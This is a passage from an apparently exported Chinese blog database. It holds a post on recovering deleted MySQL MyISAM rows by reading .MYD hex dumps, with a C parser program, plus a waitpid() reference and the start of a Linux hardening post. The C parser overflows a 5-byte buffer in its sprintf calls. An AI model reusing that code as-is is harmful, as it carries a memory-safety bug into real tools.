73 77 64 31  ^Hpasswd1\n33 6B C2 0F\n前20位被破坏了,但是后面的数据还可以,只是数据很少了,如果没有数据写入的话,还有一线恢复的生机,主要找到后面数据的对应关系才能恢复\n如果是大批量的数据被删除,恢复就需要看运气了,大家还是定时做好备份和开始mysql的log-bin模式.\n关于头长度和delete头长度请阅读mysql官方\nhttps://dev.mysql.com/doc/internals/en/layout-record-storage-frame.html\n</code></pre>\n关于解析test.MYD文件格式,写了一些代码希望对理解MDY文件结构有些帮助.\n<pre><code>key1088@key1088-host:~/code/repari$ cat repariMYD.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;arpa/inet.h&gt;\nvoid writeSQL(char *filebuf,unsigned int flen);\nint main(int argc, char **argv)\n&#123;\n    int fd=0;\n    unsigned flen = 0;\n    unsigned char *filebuf = NULL;\n    struct stat fsbuf;\n    char    *filename = NULL;\n    if ( argc &lt; 2 ) &#123;\n        printf(\"repari Mysql MyISAM DataFile\\n\");\n        printf(\"%s [MyISAM DATA .MYD File] \\n\", argv[0]);\n        exit(-1);\n    &#125;\n    filename = argv[1];\n    if ( stat(filename,&amp;fsbuf) == -1 ) &#123;\n        printf(\"open file test.MYD error,msg = %s\\n\", strerror(errno));\n        exit(-1);\n    &#125;\n    flen = fsbuf.st_size;\n    printf(\"Read %s filesize is %u\\n\", argv[1], flen);\n    if ( flen == 0 ) &#123;\n        printf(\"file is empty\\n\");\n        exit(-1);\n    &#125;\n    if( (fd=open(filename,O_RDONLY) ) == -1 ) &#123;\n        printf(\"open file test.MYD error,msg = %s\\n\", strerror(errno));\n        exit(-1);\n    &#125;\n    filebuf = (unsigned char *)malloc(flen*sizeof(char)+1);\n    if ( filebuf == NULL ) &#123;\n        printf(\"malloc error,msg = %s\\n\", strerror(errno));\n        close(fd);\n        exit(-1);\n    &#125;\n    read(fd,filebuf,flen);\n    close(fd);\n    writeSQL(filebuf,flen);\n    free(filebuf);\n    return 0;\n&#125;\nvoid writeSQL(char *filebuf,unsigned int flen)\n&#123;\n    char    c;\n    unsigned i = 0;\n    long tmplen = 0;\n    unsigned char tmp[5];\n    unsigned char tmpchar[255+1];\n    int y,m,d;\n    while ( i &lt; flen ) &#123;\n        if ( filebuf[i] == 0x00 ) &#123;\n            i++;\n        &#125;\n        printf(\"head=[%02x]\", filebuf[i]);\n        if( filebuf[i] == 0x03 ) &#123;\n            i = i + 1 + 4; /* 1 + 4head */\n        &#125; else if ( filebuf[i] == 0x01 ) &#123;\n            i = i + 1 + 3; /* 1 + 3head */\n        &#125;\n        /* int 4B */\n        memset(tmp,0x00,sizeof(tmp));\n        if ( (i+4) &gt;  flen ) &#123;\n            printf(\"\\nover\\n\");\n            return;\n        &#125;\n        memcpy(tmp,filebuf + i, 4);\n        /*需要倒序*/\n        sprintf(tmp,\"%02x%02x%02x%02x\",tmp[3],tmp[2],tmp[1],tmp[0]);\n        printf(\"[%s] %ld - \", tmp, strtol(tmp,NULL, 16));\n        i = i + 4;\n        /*varchar */\n            /* 1位长度 */\n        memset(tmp,0x00,sizeof(tmp));\n        if ( (i+1) &gt;  flen ) &#123;\n            printf(\"\\nover\\n\");\n            return;\n        &#125;\n        memcpy(tmp,filebuf + i, 1);\n        sprintf(tmp,\"%02x\",tmp[0]);\n        tmplen = strtol(tmp,NULL,16);\n        i = i + 1;\n            /* DATA */\n        memset(tmpchar,0x00,sizeof(tmpchar));\n        if ( (i + tmplen)&gt;  flen ) &#123;\n            printf(\"\\nover\\n\");\n            return;\n        &#125;\n        memcpy(tmpchar,filebuf + i, tmplen);\n        printf(\"%s - \", tmpchar);\n        i = i + tmplen;\n        /*varchar*/\n            /* 1位长度 */\n        memset(tmp,0x00,sizeof(tmp));\n        if ( (i+1) &gt;  flen ) &#123;\n            printf(\"\\nover\\n\");\n            return;\n        &#125;\n        memcpy(tmp,filebuf + i, 1);\n        sprintf(tmp,\"%02x\",tmp[0]);\n        tmplen = strtol(tmp,NULL,16);\n        i = i + 1;\n            /* DATA */\n        memset(tmpchar,0x00,sizeof(tmpchar));\n        if ( (i+tmplen) &gt;  flen ) &#123;\n            printf(\"\\nover\\n\");\n            return;\n        &#125;\n        memcpy(tmpchar,filebuf + i, tmplen);\n        printf(\"%s - \", tmpchar);\n        i = i + tmplen;\n        /*date 3位 */\n        memset(tmp,0x00,sizeof(tmp));\n        memset(tmpchar,0x00,sizeof(tmpchar));\n        if( (i+3) &gt; flen) &#123;\n            printf(\"\\nover\\n\");\n            return;\n        &#125;\n        memcpy(tmp,filebuf + i,3);\n        sprintf(tmpchar,\"%02x%02x%02x\",tmp[2],tmp[1],tmp[0]);\n        tmplen = strtol(tmpchar,NULL,16);\n        y = m = d = 0;\n        y = tmplen / 32 / 16;\n        m = (tmplen - (32*16*y)) / 32;\n        d = tmplen - (32*16*y) - (32*m);\n        printf(\"%d-%d-%d\",y,m,d);\n        i = i + 3;\n        printf(\"\\n\");\n    &#125;\n&#125;\nkey1088@key1088-host:~/code/repari$\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>如果使用MYSQL数据库,不一小心误操作,删除掉不该删除的数据,同时又没有打开BIN-LOG,怎么办呢?除了后悔没有按时备份还能怎么办??本篇带来一遍恢复数据的文档,不能完全恢复只是给一个思路<br>此方法只用与MyISAM引擎,同时只是实用于部分数据,如果使用delete from xxx不带where条件的删除,是没有办法恢复的,使用此方法也不能完全恢复,只会找回一些数据,总比没有什么都没有要一些吧.<br>还有网上很多文档说delete只是修改的索引值而不是真正的删除,这个至少我没有办法也许是版本的问题就不去深究了.<br>**注意:当遇到数据被误删除事,请不要立马恢复之前的备份(如果可以的),而是先把服务停掉不让其继续写数据,再把数据库的数据文件备份出来,在mysql数据目录下面,已数据库名称为目录.<br>**<br>开始操作<br>MyISAM的存储引擎每一个表需要三个文件,如下(XXX代表表名称):</p>\n<blockquote>\n  <ul>\n  <li>XXX.frm  表结构</li>\n  <li>XXX.MYD  数据文件   </li>\n  <li>XXX.MYI  索引文件</li>\n  </ul>\n</blockquote>\n恢复数据我们只需要重点关注数据文件即可.使用16进制模式打开文件,看一下文件内容隐约能看到一些内容.\n在WINDOWS下面可以用UE打开,在linux下面直接使用hexdump命令即可,命令如下:\n<pre><code>hexdump -e '8/1 \"%02X \"\"\\t\"\" \"' -e '8/1 \"%c\"\"\\n\"'  test.MYD\n</code></pre>\n在打开数据文件之前,先看一下我使用的数据表结构和测试数据.\n<pre><code>mysql&gt; desc test;\n+------------+-------------+------+-----+---------+-------+\n| Field      | Type        | Null | Key | Default | Extra |\n+------------+-------------+------+-----+---------+-------+\n| userid     | int(10)     | NO   | PRI | NULL    |       |\n| username   | varchar(60) | NO   |     | NULL    |       |\n| password   | varchar(60) | NO   |     | NULL    |       |\n| lastupdate | date        | NO   |     | NULL    |       |\n+------------+-------------+------+-----+---------+-------+\n4 rows in set (0.00 sec)\nmysql&gt; select * from test limit 10,10;\n+--------+----------+----------+------------+\n| userid | username | password | lastupdate |\n+--------+----------+----------+------------+\n|     13 | admin13  | passwd13 | 2017-03-11 |\n|     14 | admin14  | passwd14 | 2017-03-11 |\n|     15 | admin15  | passwd15 | 2017-03-11 |\n|     16 | admin16  | passwd16 | 2017-03-11 |\n|     17 | admin17  | passwd17 | 2017-03-11 |\n|     18 | admin18  | passwd18 | 2017-03-11 |\n|     19 | admin19  | passwd19 | 2017-03-11 |\n|     20 | admin20  | passwd20 | 2017-03-11 |\n|     21 | admin21  | passwd21 | 2017-03-11 |\n|     22 | admin22  | passwd22 | 2017-03-11 |\n+--------+----------+----------+------------+\n10 rows in set (0.00 sec)\n</code></pre>\n然后打开数据文件,截取一段16进制数据.\n<pre><code>69 6E 31 32 08 70 61 73  in12^Hpas\n73 77 64 31 32 6B C2 0F  swd12kÂ^O\n01 00 19 00 0D 00 00 00  ^A^@^Y^@^M^@^@^@\n07 61 64 6D 69 6E 31 33  ^Gadmin13\n08 70 61 73 73 77 64 31  ^Hpasswd1\n33 6B C2 0F 01 00 19 00  3kÂ^O^A^@^Y^@\n0E 00 00 00 07 61 64 6D  ^N^@^@^@^Gadm\n69 6E 31 34 08 70 61 73  in14^Hpas\n73 77 64 31 34 6B C2 0F  swd14kÂ^O\n01 00 19 00 0F 00 00 00  ^A^@^Y^@^O^@^@^@\n07 61 64 6D 69 6E 31 35  ^Gadmin15\n08 70 61 73 73 77 64 31  ^Hpasswd1\n35 6B C2 0F 01 00 19 00  5kÂ^O^A^@^Y^@\n10 00 00 00 07 61 64 6D  ^P^@^@^@^Gadm\n69 6E 31 36 08 70 61 73  in16^Hpas\n73 77 64 31 36 6B C2 0F  swd16kÂ^O\n01 00 19 00 11 00 00 00  ^A^@^Y^@^Q^@^@^@\n07 61 64 6D 69 6E 31 37  ^Gadmin17\n08 70 61 73 73 77 64 31  ^Hpasswd1\n37 6B C2 0F 01 00 19 00  7kÂ^O^A^@^Y^@\n12 00 00 00 07 61 64 6D  ^R^@^@^@^Gadm\n69 6E 31 38 08 70 61 73  in18^Hpas\n73 77 64 31 38 6B C2 0F  swd18kÂ^O\n01 00 19 00 13 00 00 00  ^A^@^Y^@^S^@^@^@\n07 61 64 6D 69 6E 31 39  ^Gadmin19\n08 70 61 73 73 77 64 31  ^Hpasswd1\n39 6B C2 0F 01 00 19 00  9kÂ^O^A^@^Y^@\n14 00 00 00 07 61 64 6D  ^T^@^@^@^Gadm\n69 6E 32 30 08 70 61 73  in20^Hpas\n73 77 64 32 30 6B C2 0F  swd20kÂ^O\n01 00 19 00 15 00 00 00  ^A^@^Y^@^U^@^@^@\n07 61 64 6D 69 6E 32 31  ^Gadmin21\n08 70 61 73 73 77 64 32  ^Hpasswd2\n31 6B C2 0F 01 00 19 00  1kÂ^O^A^@^Y^@\n16 00 00 00 07 61 64 6D  ^V^@^@^@^Gadm\n69 6E 32 32 08 70 61 73  in22^Hpas\n73 77 64 32 32 6B C2 0F  swd22kÂ^O\n01 00 19 00 17 00 00 00  ^A^@^Y^@^W^@^@^@\n07 61 64 6D 69 6E 32 33  ^Gadmin23\n08 70 61 73 73 77 64 32  ^Hpasswd2\n</code></pre>\nuserid=13的明细对应着一下16进制数据快.\n<pre><code>01 00 19 00 0D 00 00 00  ^A^@^Y^@^M^@^@^@\n07 61 64 6D 69 6E 31 33  ^Gadmin13\n08 70 61 73 73 77 64 31  ^Hpasswd1\n33 6B C2 0F\n</code></pre>\n简单解析一下这些数据结构的意思.\n<blockquote>\n  <ul>\n  <li>01 00 19 00                              :这里是4位数据头,不代表头就是4为,这个数据头不固定</li>\n  <li>0D 00 00 00                              :为userid的值13,int占4位.</li>\n  <li>07 61 64 6D 69 6E 31 33        :07代表长度 后面7位为数据,varchar数据这样表示.</li>\n  <li>08 70 61 73 73 77 64 31 33   :varchar和上面一样.</li>\n  <li>6B C2 0F                                   :为date类型,占位为3.值为2017,计算方法是\"day + month<em>32 + year</em>16*32'\"</li>\n  <li>具体其他数据字段长度和结构可以详见MYSQL官方文档\n  https://dev.mysql.com/doc/internals/en/myisam-column-attributes.html</li>\n  </ul>\n</blockquote>\n咱们删除一条数据看一下数据快的变化:\n<pre><code>mysql&gt; delete from test where userid = 13;\nQuery OK, 1 row affected (0.00 sec)\nmysql&gt; select * from test limit 9,10;\n+--------+----------+----------+------------+\n| userid | username | password | lastupdate |\n+--------+----------+----------+------------+\n|     12 | admin12  | passwd12 | 2017-03-11 |\n|     14 | admin14  | passwd14 | 2017-03-11 |\n|     15 | admin15  | passwd15 | 2017-03-11 |\n|     16 | admin16  | passwd16 | 2017-03-11 |\n|     17 | admin17  | passwd17 | 2017-03-11 |\n|     18 | admin18  | passwd18 | 2017-03-11 |\n|     19 | admin19  | passwd19 | 2017-03-11 |\n|     20 | admin20  | passwd20 | 2017-03-11 |\n|     21 | admin21  | passwd21 | 2017-03-11 |\n|     22 | admin22  | passwd22 | 2017-03-11 |\n+--------+----------+----------+------------+\n10 rows in set (0.00 sec)\n删除后的数据块如下:\n69 6E 31 32 08 70 61 73  in12^Hpas\n73 77 64 31 32 6B C2 0F  swd12kÂ^O\n00 00 00 1C 00 00 00 00  ^@^@^@^\\^@^@^@^@\n00 00 0A D4 FF FF FF FF  ^@^@Ôÿÿÿÿ\nFF FF FF FF 73 77 64 31  ÿÿÿÿswd1\n33 6B C2 0F 01 00 19 00  3kÂ^O^A^@^Y^@\n0E 00 00 00 07 61 64 6D  ^N^@^@^@^Gadm\n69 6E 31 34 08 70 61 73  in14^Hpas\n73 77 64 31 34 6B C2 0F  swd14kÂ^O\n01 00 19 00 0F 00 00 00  ^A^@^Y^@^O^@^@^@\n07 61 64 6D 69 6E 31 35  ^Gadmin15\n08 70 61 73 73 77 64 31  ^Hpasswd1\n35 6B C2 0F 01 00 19 00  5kÂ^O^A^@^Y^@\n10 00 00 00 07 61 64 6D  ^P^@^@^@^Gadm\n69 6E 31 36 08 70 61 73  in16^Hpas\n73 77 64 31 36 6B C2 0F  swd16kÂ^O\n01 00 19 00 11 00 00 00  ^A^@^Y^@^Q^@^@^@\n07 61 64 6D 69 6E 31 37  ^Gadmin17\n08 70 61 73 73 77 64 31  ^Hpasswd1\n37 6B C2 0F 01 00 19 00  7kÂ^O^A^@^Y^@\n12 00 00 00 07 61 64 6D  ^R^@^@^@^Gadm\n</code></pre>\nUSERID=13数据块变化对比\n<pre><code>delete后\n00 00 00 1C 00 00 00 00  ^@^@^@^\\^@^@^@^@\n00 00 0A D4 FF FF FF FF  ^@^@Ôÿÿÿÿ\nFF FF FF FF 73 77 64 31  ÿÿÿÿswd1\n33 6B C2\ndelete前\n01 00 19 00 0D 00 00 00  ^A^@^Y^@^M^@^@^@\n07 61 64 6D 69 6E 31 33  ^Gadmin13\n08 70 61 73 73 77 64 31  ^Hpasswd1\n33 6B C2 0F\n前20位被破坏了,但是后面的数据还可以,只是数据很少了,如果没有数据写入的话,还有一线恢复的生机,主要找到后面数据的对应关系才能恢复\n如果是大批量的数据被删除,恢复就需要看运气了,大家还是定时做好备份和开始mysql的log-bin模式.\n关于头长度和delete头长度请阅读mysql官方\nhttps://dev.mysql.com/doc/internals/en/layout-record-storage-frame.html\n</code></pre>\n关于解析test.MYD文件格式,写了一些代码希望对理解MDY文件结构有些帮助.\n<pre><code>key1088@key1088-host:~/code/repari$ cat repariMYD.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;arpa/inet.h&gt;\nvoid writeSQL(char *filebuf,unsigned int flen);\nint main(int argc, char **argv)\n&#123;\n    int fd=0;\n    unsigned flen = 0;\n    unsigned char *filebuf = NULL;\n    struct stat fsbuf;\n    char    *filename = NULL;\n    if ( argc &lt; 2 ) &#123;\n        printf(\"repari Mysql MyISAM DataFile\\n\");\n        printf(\"%s [MyISAM DATA .MYD File] \\n\", argv[0]);\n        exit(-1);\n    &#125;\n    filename = argv[1];\n    if ( stat(filename,&amp;fsbuf) == -1 ) &#123;\n        printf(\"open file test.MYD error,msg = %s\\n\", strerror(errno));\n        exit(-1);\n    &#125;\n    flen = fsbuf.st_size;\n    printf(\"Read %s filesize is %u\\n\", argv[1], flen);\n    if ( flen == 0 ) &#123;\n        printf(\"file is empty\\n\");\n        exit(-1);\n    &#125;\n    if( (fd=open(filename,O_RDONLY) ) == -1 ) &#123;\n        printf(\"open file test.MYD error,msg = %s\\n\", strerror(errno));\n        exit(-1);\n    &#125;\n    filebuf = (unsigned char *)malloc(flen*sizeof(char)+1);\n    if ( filebuf == NULL ) &#123;\n        printf(\"malloc error,msg = %s\\n\", strerror(errno));\n        close(fd);\n        exit(-1);\n    &#125;\n    read(fd,filebuf,flen);\n    close(fd);\n    writeSQL(filebuf,flen);\n    free(filebuf);\n    return 0;\n&#125;\nvoid writeSQL(char *filebuf,unsigned int flen)\n&#123;\n    char    c;\n    unsigned i = 0;\n    long tmplen = 0;\n    unsigned char tmp[5];\n    unsigned char tmpchar[255+1];\n    int y,m,d;\n    while ( i &lt; flen ) &#123;\n        if ( filebuf[i] == 0x00 ) &#123;\n            i++;\n        &#125;\n        printf(\"head=[%02x]\", filebuf[i]);\n        if( filebuf[i] == 0x03 ) &#123;\n            i = i + 1 + 4; /* 1 + 4head */\n        &#125; else if ( filebuf[i] == 0x01 ) &#123;\n            i = i + 1 + 3; /* 1 + 3head */\n        &#125;\n        /* int 4B */\n        memset(tmp,0x00,sizeof(tmp));\n        if ( (i+4) &gt;  flen ) &#123;\n            printf(\"\\nover\\n\");\n            return;\n        &#125;\n        memcpy(tmp,filebuf + i, 4);\n        /*需要倒序*/\n        sprintf(tmp,\"%02x%02x%02x%02x\",tmp[3],tmp[2],tmp[1],tmp[0]);\n        printf(\"[%s] %ld - \", tmp, strtol(tmp,NULL, 16));\n        i = i + 4;\n        /*varchar */\n            /* 1位长度 */\n        memset(tmp,0x00,sizeof(tmp));\n        if ( (i+1) &gt;  flen ) &#123;\n            printf(\"\\nover\\n\");\n            return;\n        &#125;\n        memcpy(tmp,filebuf + i, 1);\n        sprintf(tmp,\"%02x\",tmp[0]);\n        tmplen = strtol(tmp,NULL,16);\n        i = i + 1;\n            /* DATA */\n        memset(tmpchar,0x00,sizeof(tmpchar));\n        if ( (i + tmplen)&gt;  flen ) &#123;\n            printf(\"\\nover\\n\");\n            return;\n        &#125;\n        memcpy(tmpchar,filebuf + i, tmplen);\n        printf(\"%s - \", tmpchar);\n        i = i + tmplen;\n        /*varchar*/\n            /* 1位长度 */\n        memset(tmp,0x00,sizeof(tmp));\n        if ( (i+1) &gt;  flen ) &#123;\n            printf(\"\\nover\\n\");\n            return;\n        &#125;\n        memcpy(tmp,filebuf + i, 1);\n        sprintf(tmp,\"%02x\",tmp[0]);\n        tmplen = strtol(tmp,NULL,16);\n        i = i + 1;\n            /* DATA */\n        memset(tmpchar,0x00,sizeof(tmpchar));\n        if ( (i+tmplen) &gt;  flen ) &#123;\n            printf(\"\\nover\\n\");\n            return;\n        &#125;\n        memcpy(tmpchar,filebuf + i, tmplen);\n        printf(\"%s - \", tmpchar);\n        i = i + tmplen;\n        /*date 3位 */\n        memset(tmp,0x00,sizeof(tmp));\n        memset(tmpchar,0x00,sizeof(tmpchar));\n        if( (i+3) &gt; flen) &#123;\n            printf(\"\\nover\\n\");\n            return;\n        &#125;\n        memcpy(tmp,filebuf + i,3);\n        sprintf(tmpchar,\"%02x%02x%02x\",tmp[2],tmp[1],tmp[0]);\n        tmplen = strtol(tmpchar,NULL,16);\n        y = m = d = 0;\n        y = tmplen / 32 / 16;\n        m = (tmplen - (32*16*y)) / 32;\n        d = tmplen - (32*16*y) - (32*m);\n        printf(\"%d-%d-%d\",y,m,d);\n        i = i + 3;\n        printf(\"\\n\");\n    &#125;\n&#125;\nkey1088@key1088-host:~/code/repari$\n</code></pre>"},{"title":"函数说明  waitpid()","date":"2012-08-24T07:56:00.000Z","_content":"<p>waitpid（等待子进程中断或结束）&nbsp;</p><p>&nbsp;<br />相关函数&nbsp;&nbsp;wait，fork<br />&nbsp;&nbsp;<br />表头文件&nbsp;&nbsp;#include&lt;sys/types.h&gt;<br />#include&lt;sys/wait.h&gt;<br />&nbsp;&nbsp;<br />定义函数&nbsp;&nbsp;pid_t&nbsp;waitpid(pid_t&nbsp;pid,int*&nbsp;status,int&nbsp;options);<br />&nbsp;&nbsp;<br />函数说明&nbsp;&nbsp;waitpid()<br />会暂时停止目前进程的执行，直到有信号来到或子进程结束。如果在调用wait()<br />时子进程已经结束，则wait()<br />会立即返回子进程结束状态值。子进程的结束状态值会由参数status<br />返回，而子进程的进程识别码也会一快返回。如果不在意结束状态值，则参数status<br />可以设成NULL。参数pid为欲等待的子进程识别码，其他数值意义如下:<br />pid&lt;-1&nbsp;等待进程组识别码为pid绝对值的任何子进程。<br />pid=-1&nbsp;等待任何子进程，相当于wait()。<br />pid=0&nbsp;等待进程组识别码与目前进程相同的任何子进程。<br />pid&gt;0&nbsp;等待任何子进程识别码为pid的子进程。<br />参数option可以为0&nbsp;或下面的OR&nbsp;组合<br />WNOHANG&nbsp;如果没有任何已经结束的子进程则马上返回，不予以等待。<br />WUNTRACED&nbsp;如果子进程进入暂停执行情况则马上返回，但结束状态不予以理会。<br />子进程的结束状态返回后存于status，底下有几个宏可判别结束情况<br />WIFEXITED(status)如果子进程正常结束则为非0值。<br />WEXITSTATUS(status)取得子进程exit()返回的结束代码，一般会先用WIFEXITED&nbsp;&nbsp;<br />来判断是否正常结束才能使用此宏。<br />WIFSIGNALED(status)如果子进程是因为信号而结束则此宏值为真<br />WTERMSIG(status)取得子进程因信号而中止的信号代码，一般会先用WIFSIGNALED&nbsp;&nbsp;<br />来判断后才使用此宏。<br />WIFSTOPPED(status)如果子进程处于暂停执行情况则此宏值为真。一般只有使用<br />WUNTRACED&nbsp;时才会有此情况。<br />WSTOPSIG(status)取得引发子进程暂停的信号代码，一般会先用WIFSTOPPED&nbsp;&nbsp;<br />来判断后才使用此宏。<br />&nbsp;&nbsp;<br />返回值&nbsp;&nbsp;如果执行成功则返回子进程识别码(PID)，如果有错误发生则返回-1<br />。失败原因存于errno中。</p><p><br /></p>","source":"_posts/函数说明--waitpid().md","raw":"title: 函数说明  waitpid()\ncategories: [C编程]\ntags: []\ndate: 2012-08-24 15:56:00\n---\n<p>waitpid（等待子进程中断或结束）&nbsp;</p><p>&nbsp;<br />相关函数&nbsp;&nbsp;wait，fork<br />&nbsp;&nbsp;<br />表头文件&nbsp;&nbsp;#include&lt;sys/types.h&gt;<br />#include&lt;sys/wait.h&gt;<br />&nbsp;&nbsp;<br />定义函数&nbsp;&nbsp;pid_t&nbsp;waitpid(pid_t&nbsp;pid,int*&nbsp;status,int&nbsp;options);<br />&nbsp;&nbsp;<br />函数说明&nbsp;&nbsp;waitpid()<br />会暂时停止目前进程的执行，直到有信号来到或子进程结束。如果在调用wait()<br />时子进程已经结束，则wait()<br />会立即返回子进程结束状态值。子进程的结束状态值会由参数status<br />返回，而子进程的进程识别码也会一快返回。如果不在意结束状态值，则参数status<br />可以设成NULL。参数pid为欲等待的子进程识别码，其他数值意义如下:<br />pid&lt;-1&nbsp;等待进程组识别码为pid绝对值的任何子进程。<br />pid=-1&nbsp;等待任何子进程，相当于wait()。<br />pid=0&nbsp;等待进程组识别码与目前进程相同的任何子进程。<br />pid&gt;0&nbsp;等待任何子进程识别码为pid的子进程。<br />参数option可以为0&nbsp;或下面的OR&nbsp;组合<br />WNOHANG&nbsp;如果没有任何已经结束的子进程则马上返回，不予以等待。<br />WUNTRACED&nbsp;如果子进程进入暂停执行情况则马上返回，但结束状态不予以理会。<br />子进程的结束状态返回后存于status，底下有几个宏可判别结束情况<br />WIFEXITED(status)如果子进程正常结束则为非0值。<br />WEXITSTATUS(status)取得子进程exit()返回的结束代码，一般会先用WIFEXITED&nbsp;&nbsp;<br />来判断是否正常结束才能使用此宏。<br />WIFSIGNALED(status)如果子进程是因为信号而结束则此宏值为真<br />WTERMSIG(status)取得子进程因信号而中止的信号代码，一般会先用WIFSIGNALED&nbsp;&nbsp;<br />来判断后才使用此宏。<br />WIFSTOPPED(status)如果子进程处于暂停执行情况则此宏值为真。一般只有使用<br />WUNTRACED&nbsp;时才会有此情况。<br />WSTOPSIG(status)取得引发子进程暂停的信号代码，一般会先用WIFSTOPPED&nbsp;&nbsp;<br />来判断后才使用此宏。<br />&nbsp;&nbsp;<br />返回值&nbsp;&nbsp;如果执行成功则返回子进程识别码(PID)，如果有错误发生则返回-1<br />。失败原因存于errno中。</p><p><br /></p>","slug":"函数说明--waitpid()","published":1,"updated":"2023-04-22T05:38:45.009Z","_id":"clgrjlxku009h7opi7tf9dhtb","comments":1,"layout":"post","photos":[],"link":"","content":"<p>waitpid（等待子进程中断或结束）&nbsp;</p><p>&nbsp;<br />相关函数&nbsp;&nbsp;wait，fork<br />&nbsp;&nbsp;<br />表头文件&nbsp;&nbsp;#include&lt;sys/types.h&gt;<br />#include&lt;sys/wait.h&gt;<br />&nbsp;&nbsp;<br />定义函数&nbsp;&nbsp;pid_t&nbsp;waitpid(pid_t&nbsp;pid,int*&nbsp;status,int&nbsp;options);<br />&nbsp;&nbsp;<br />函数说明&nbsp;&nbsp;waitpid()<br />会暂时停止目前进程的执行，直到有信号来到或子进程结束。如果在调用wait()<br />时子进程已经结束，则wait()<br />会立即返回子进程结束状态值。子进程的结束状态值会由参数status<br />返回，而子进程的进程识别码也会一快返回。如果不在意结束状态值，则参数status<br />可以设成NULL。参数pid为欲等待的子进程识别码，其他数值意义如下:<br />pid&lt;-1&nbsp;等待进程组识别码为pid绝对值的任何子进程。<br />pid=-1&nbsp;等待任何子进程，相当于wait()。<br />pid=0&nbsp;等待进程组识别码与目前进程相同的任何子进程。<br />pid&gt;0&nbsp;等待任何子进程识别码为pid的子进程。<br />参数option可以为0&nbsp;或下面的OR&nbsp;组合<br />WNOHANG&nbsp;如果没有任何已经结束的子进程则马上返回，不予以等待。<br />WUNTRACED&nbsp;如果子进程进入暂停执行情况则马上返回，但结束状态不予以理会。<br />子进程的结束状态返回后存于status，底下有几个宏可判别结束情况<br />WIFEXITED(status)如果子进程正常结束则为非0值。<br />WEXITSTATUS(status)取得子进程exit()返回的结束代码，一般会先用WIFEXITED&nbsp;&nbsp;<br />来判断是否正常结束才能使用此宏。<br />WIFSIGNALED(status)如果子进程是因为信号而结束则此宏值为真<br />WTERMSIG(status)取得子进程因信号而中止的信号代码，一般会先用WIFSIGNALED&nbsp;&nbsp;<br />来判断后才使用此宏。<br />WIFSTOPPED(status)如果子进程处于暂停执行情况则此宏值为真。一般只有使用<br />WUNTRACED&nbsp;时才会有此情况。<br />WSTOPSIG(status)取得引发子进程暂停的信号代码，一般会先用WIFSTOPPED&nbsp;&nbsp;<br />来判断后才使用此宏。<br />&nbsp;&nbsp;<br />返回值&nbsp;&nbsp;如果执行成功则返回子进程识别码(PID)，如果有错误发生则返回-1<br />。失败原因存于errno中。</p><p><br /></p>","site":{"data":{}},"excerpt":"","more":"<p>waitpid（等待子进程中断或结束）&nbsp;</p><p>&nbsp;<br />相关函数&nbsp;&nbsp;wait，fork<br />&nbsp;&nbsp;<br />表头文件&nbsp;&nbsp;#include&lt;sys/types.h&gt;<br />#include&lt;sys/wait.h&gt;<br />&nbsp;&nbsp;<br />定义函数&nbsp;&nbsp;pid_t&nbsp;waitpid(pid_t&nbsp;pid,int*&nbsp;status,int&nbsp;options);<br />&nbsp;&nbsp;<br />函数说明&nbsp;&nbsp;waitpid()<br />会暂时停止目前进程的执行，直到有信号来到或子进程结束。如果在调用wait()<br />时子进程已经结束，则wait()<br />会立即返回子进程结束状态值。子进程的结束状态值会由参数status<br />返回，而子进程的进程识别码也会一快返回。如果不在意结束状态值，则参数status<br />可以设成NULL。参数pid为欲等待的子进程识别码，其他数值意义如下:<br />pid&lt;-1&nbsp;等待进程组识别码为pid绝对值的任何子进程。<br />pid=-1&nbsp;等待任何子进程，相当于wait()。<br />pid=0&nbsp;等待进程组识别码与目前进程相同的任何子进程。<br />pid&gt;0&nbsp;等待任何子进程识别码为pid的子进程。<br />参数option可以为0&nbsp;或下面的OR&nbsp;组合<br />WNOHANG&nbsp;如果没有任何已经结束的子进程则马上返回，不予以等待。<br />WUNTRACED&nbsp;如果子进程进入暂停执行情况则马上返回，但结束状态不予以理会。<br />子进程的结束状态返回后存于status，底下有几个宏可判别结束情况<br />WIFEXITED(status)如果子进程正常结束则为非0值。<br />WEXITSTATUS(status)取得子进程exit()返回的结束代码，一般会先用WIFEXITED&nbsp;&nbsp;<br />来判断是否正常结束才能使用此宏。<br />WIFSIGNALED(status)如果子进程是因为信号而结束则此宏值为真<br />WTERMSIG(status)取得子进程因信号而中止的信号代码，一般会先用WIFSIGNALED&nbsp;&nbsp;<br />来判断后才使用此宏。<br />WIFSTOPPED(status)如果子进程处于暂停执行情况则此宏值为真。一般只有使用<br />WUNTRACED&nbsp;时才会有此情况。<br />WSTOPSIG(status)取得引发子进程暂停的信号代码，一般会先用WIFSTOPPED&nbsp;&nbsp;<br />来判断后才使用此宏。<br />&nbsp;&nbsp;<br />返回值&nbsp;&nbsp;如果执行成功则返回子进程识别码(PID)，如果有错误发生则返回-1<br />。失败原因存于errno中。</p><p><br /></p>"},{"title":"对linux服务器的一些安全设置","date":"2011-07-12T09:01:00.000Z","_content":"<p>本地服务器架构为LAMP的。以下设置多多少少会增加不多安全。</p><p>&nbsp;</p><p>1.账号安全</p><p>禁用不需要的用户和系统账号，或者shell设置为/sbin/nologin,宿主目录为/dev/null，权限放低。</p><p>密码不能设置简单，密码最好不要与自己的信息有关系，日期、名称、电话、网址。最好为一句话，好记，又不容易被社工。</p><p>2.服务安全</p><p>禁用不需要的服务，修改常用的服务端口（自己用的话）。</p><p>3.mysql安全</p><p>在php中不要使用root连接。新建一个用户，只需要给 “增删改查” 